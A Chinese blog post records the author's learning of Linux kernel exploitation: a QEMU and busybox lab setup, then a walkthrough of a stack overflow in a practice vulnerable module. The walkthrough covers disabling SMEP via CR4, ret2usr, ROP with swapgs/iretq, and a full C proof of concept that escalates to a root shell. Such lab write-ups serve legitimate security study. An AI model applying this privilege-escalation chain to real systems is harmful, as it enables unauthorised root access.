---
title: linux kernel 爬坑记录
date: 2018-09-21 00:00:00
categories:
- 学习记录
tags: Kernel
---
##  linux kernel 爬坑记录

好久以前就觉得研究二进制安全kernel方面一直是一个大坑，最近跟着网上的教程看了一下，记录一下所学的以及一些坑

主要参考的链接是[这个](https://xz.aliyun.com/t/2306)

### 安装qume

```sudo apt-get install qemu qemu-system```

### 内核安装与编译

```
https://mirrors.edge.kernel.org/pub/linux/kernel
```

到这个网站上找一个内核版本，wget下来（我这里是用的4.4.11）

而后



```
tar -zxvf 文件名.tar.gz
cd linux-4.4.11/
apt-get install libncurses5-dev build-essential kernel-package
make menuconfig
```

配置一些选项，主要就是：

**KernelHacking -->**

- **选中Compile the kernel with debug info**
- **选中Compile the kernel with frame pointers**
- **选中KGDB:kernel debugging with remote gdb，其下的全部都选中。**

**Processor type and features-->**

- **去掉Paravirtualized guest support**

**KernelHacking-->**

- **去掉Write protect kernel read-only data structures（否则不能用软件断点）**

搞完之后

```
make
make all
make modules
```

之后还要安装busybox来启动内核

```
cd ..
wget https://busybox.net/downloads/busybox-1.29.3.tar.bz
tar -jxvf busybox-1.29.3.tar.bz2
cd busybox-1.29.3
make menuconfig  
make install
```

一些相关的配置

**make menuconfig 设置**

**Busybox Settings -> Build Options -> Build Busybox as a static binary 编译成 静态文件**

**关闭下面两个选项**

**Linux System Utilities -> [] Support mounting NFS file system 网络文件系统**
**Networking Utilities -> [] inetd (Internet超级服务器)**

### 构建文件系统

```
cd _install
mkdir proc sys dev etc etc/init.d
vim etc/init.d/rcS
```

在rcs文件里写入一下内容：

```bash
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
/sbin/mdev -s
```

而后

```
chmod +x etc/init.d/rCS
find . | cpio -o --format=newc > ../rootfs.img
```

这样配置过程就完成了，qemu就可以启动内核了

```bash
root@s3cunDa:/# qemu-system-x86_64 -kernel /pwn/kernel_test/linux-4.4.11/arch/x86/boot/bzImage -initrd /pwn/kernel_test/busybox-1.29.3/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" -cpu kvm64,+smep,+smap --nographic -gdb tcp::1111
```

挂载了tcp端口，我们就可以利用gdb调试内核了，在调试之前输入gdb -q vmlinux的路径，这样调试的时候就会有相应的符号，进入gdb后输入remote target 端口号就可以调试了

##一些基本的利用方式

### ROP

主要利用的是刚才链接里面的文件，挂载的时候直接将里边的bzImage和rootfs加到命令里边就好了

漏洞函数写的很干脆利落，漏洞店就在write函数：

```c
static ssize_t vuln_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
{
  char buffer[100]={0};

  if (_copy_from_user(buffer, buf, len))
    return -EFAULT;
  buffer[len-1]='\0';

  printk("[i] Module vuln write: %s\n", buffer);

  strncpy(buffer_var,buffer,len);

  return len;
}
```

可以看到copyfromusr函数两个参数都是我们可控的，buffer不可控但是长度是固定的，可以栈溢出

再看一下其栈的布局

```
-000000000000007C buffer          db 100 dup(?)
-0000000000000018 anonymous_0     dq ?
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  r              db 8 dup(?)
+0000000000000008
+0000000000000008 ; end of stack variables
```

直接可以栈溢出rop一把梭

但是问题在于rop怎么找，执行什么指令

在内核空间提权的话不能仅仅是简单的system("/bin/sh")，而是需要将我们从ring3转换到ring0，其中的一种基础的方法就是commit_creds(prepare_kernel_cred(0))但是在这之前需要关闭smep

#### smep

smep就是防止内核执行用户控件的代码的一种保护机制

检查smep是否开启：

```
/ # cat /proc/cpuinfo | grep smep
flags		: fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl pni cx16 hypervisor smep smap
```

smep位于CR4寄存器的第20位，设置为1

关闭SMEP方法
修改/etc/default/grub文件中的GRUB_CMDLINE_LINUX=""，加上nosmep/nosmap/nokaslr，然后update-grub就好。

#### 关于如何获取一些函数的地址

**kptr_ restrict指示是否限制通过/ proc和其他接口暴露内核地址。**

- **0：默认情况下，没有任何限制。**
- **1：使用％pK格式说明符打印的内核指针将被替换为0，除非用户具有CAP_ SYSLOG特权**
- **2：使用％pK打印的内核指针将被替换为0而不管特权。**

正常情况下我们可以通过命令cat /proc/kallsyms获取函数地址

如果我们需要关闭限制的话需要如下命令：

sysctl -w kernel.kptr_restrict=0

而后cat /proc/kallsyms | grep commit_creds就可以得到地址了

#### ret2usr攻击

ret2usr利用了用户空间进程不能访问内核空间，但是内核空间能访问用户空间这个特性来重定向内核代码或数据流指向用户空间，并在非root权限下进行提权。

具体地方式是这样：

- **找一个函数指针来覆盖。**
- **在这里我们通常使用ptmx_fops->release()这个指针来指向要重写的内核空间。在内核空间中，ptmx_fops作为静态变量存在，它包含一个指向/ dev / ptmx的file_operations结构的指针。 file_operations结构包含一个函数指针，当对文件描述符执行诸如读/写操作时，该函数指针被执行。**
- **在用户空间中使用mmap提权payload，分配新的凭证结构：**

```
int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);
commit_creds = 0xffffffffxxxxxxxx;
prepare_kernel_cred = 0xffffffffxxxxxxxx;
void escalate_privs() { commit_creds(prepare_kernel_cred(0)); }  //获取root权限
```

**stuct cred —— cred的基本单位**
**prepare_kernel_cred —— 分配并返回一个新的cred**
**commit_creds —— 应用新的cred**

- **在用户空间创建一个新的结构体“A”。**
- **用提权函数指针来覆盖这个"A"的指针。**
- **触发提权函数，执行iretq返回用户空间，执行system("/bin/sh")提权**

#### 具体地rop构造方式

主要问题有：

1.内核smep地绕过

2.内核和用户不共享同一个栈

rop链的主体形式是这样的：

```
|----------------------|
| pop rdi; ret         |<== low mem
|----------------------|
| NULL                 |
|----------------------|
| addr of              |
| prepare_kernel_cred()|
|----------------------|
| mov rdi, rax; ret    |
|----------------------|
| addr of              |
| commit_creds()       |<== high mem
|----------------------|
```

很直观很好理解，但是相应的gadget寻找的方式与一般的二进制文件不同：

首先使用extract-vmlinux脚本来解压/boot/vmlinuz*这个压缩内核镜像。extract-vmlinux位于/usr/src/linux-headers-3.13.0-32/scripts目录。
用这个命令解压vmlinuz并保存到vmlinux：

sudo ./extract-vmlinux /boot/vmlinuz-3.13.0-32-generic > vmlinux

之后就可以用ROPgadget来获取gadget了，最好是一次性把gadget都写到一个文件中。

ROPgadget --binary vmlinux > ~/ropgadget

之后我们需要返回用户空间执行代码，

利用的是一下两个指令

```
swapgs
iretq
```

#### swapgs 使用的基本环境

> 首先，swapgs 指令的使用是基于 syscall/sysret 这种“快速切入系统服务”方案而带来的附加指令，这种方案下包括：
>
> - **syscall** 与 **sysret** 指令：用于从 ring 3 快速切入 ring 0，以及从 ring 0 快速返回到 ring 3
>
> - swapgs
>
>    
>
>   指令：这个指令的产生是由于在 syscall/sysret 的配套使用中的两个因素：
>
>   1. **不直接提供 ring 0 的 RSP 值**，而 sysenter 指令则使用 IA32_SYSENTER_ESP 寄存器来提供 RSP 值
>   2. **也不使用寄存器来保存原 RSP 值（即：原 ring 3 的 RSP 值）**，而 sysexit 指令则使用 RCX 寄存器来恢复原 RSP 值（即 ring 3 的 RSP）。
>
>   而采用一种比较迂回的方案，就是“交换得到”kernel 级别的数据结构，而这个数据结构中提供了 ring 0 的 RSP 值。
>
> - **IA32_KERNEL_GS_BASE** 寄存器：这是一个 MSR 寄存器，用来保存 kernel 级别的数据结构指针
>
> - 最后一个是 **IA32_GS_BASE** 寄存器：但这个寄存器并不是因为 swapgs 指令而存在的，是由于 x64 体系的设计
>
> swapgs 指令目的是通过 syscall 切入到 kernel 系统服务后，通过交换 IA32_KERNEL_GS_BASE 与 IA32_GS_BASE 值，从而得到 kernel 数据结构块

正常的话切换用户态和内核态而后返回需要两次swapgs，这里用了一个swapgs就达到了stackpivot的作用。

#### 关于iretq

使用iretq指令返回到用户空间，在执行iretq之前，执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。
iretq的堆栈布局如下：

```
|----------------------|
| RIP                  |<== low mem
|----------------------|
| CS                   |
|----------------------|
| EFLAGS               |
|----------------------|
| RSP                  |
|----------------------|
| SS                   |<== high mem
|----------------------|
```

新的用户空间指令指针(RIP)，用户空间堆栈指针(RSP)，代码和堆栈段选择器(CS和SS)以及具有各种状态信息的EFLAGS寄存器。

最后的rop：

```
|----------------------|
| pop rdi; ret         |<== low mem
|----------------------|
| NULL                 |
|----------------------|
| addr of              |
| prepare_kernel_cred()|
|----------------------|
| pop rdx; ret         |
|----------------------|
| addr of              |
| commit_creds()       |
|----------------------|
| mov rdi, rax ;       |
| call rdx             |
|----------------------|
| swapgs;              |
| pop rbp; ret         |
|----------------------|
| 0xdeadbeefUL         |
| iretq;               |
|----------------------|
| shell                |
|----------------------|
| CS                   |
|----------------------|
| EFLAGS               |
|----------------------|
| RSP                  |
|----------------------|
| SS                   |<== high mem
|----------------------|
```

poc：
```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

// 两个函数的地址
_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;

unsigned long xchg_eax_esp = 0xFFFFFFFF81007808;
unsigned long rdi_to_cr4 = 0xFFFFFFFF810635B4; // mov cr4, rdi ;pop rbp ; ret
unsigned long pop_rdi_ret = 0xFFFFFFFF813E7D6F;
unsigned long iretq = 0xffffffff814e35ef;
unsigned long swapgs = 0xFFFFFFFF81063694;  // swapgs ; pop rbp ; ret
unsigned long poprbpret = 0xffffffff8100202b;  //pop rbp, ret


unsigned long mmap_base = 0xb0000000;

void get_shell() {
    system("/bin/sh");
}


void get_root() {
    commit_creds(prepare_kernel_cred(0));
}

/* status */
unsigned long user_cs, user_ss, user_rflags;
void save_stats() {
    asm(
        "movq %%cs, %0\n" // mov rcx, cs
        "movq %%ss, %1\n" // mov rdx, ss
        "pushfq\n"        // 把rflags的值压栈
        "popq %2\n"       // pop rax
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory" // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax
        );
}



int main(void)
{
    int fd;
    char buf[16];

    fd = open("/dev/vuln", O_RDWR);
    if (fd == -1) {
        printf("open /dev/vuln device failed!\n");
        return -1;
    }
    
    save_stats();
    printf("mmap_addr: %p\n", mmap(mmap_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
    // 布局 rop 链
    unsigned long rop_chain[] = {
        pop_rdi_ret,
        0x6f0,
        rdi_to_cr4, // cr4 = 0x6f0
        mmap_base + 0x10000,
        (unsigned long)get_root,
        swapgs, // swapgs; pop rbp; ret
        mmap_base,   // rbp = base
        iretq,
        (unsigned long)get_shell,
        user_cs,
        user_rflags,
        mmap_base + 0x10000,
        user_ss
    };

    char * payload = malloc(0x7c + sizeof(rop_chain));
    memset(payload, 0xf1, 0x7c + sizeof(rop_chain));
    memcpy(payload + 0x7c, rop_chain, sizeof(rop_chain));
    write(fd, payload, 0x7c + sizeof(rop_chain));
    return 0;
}
```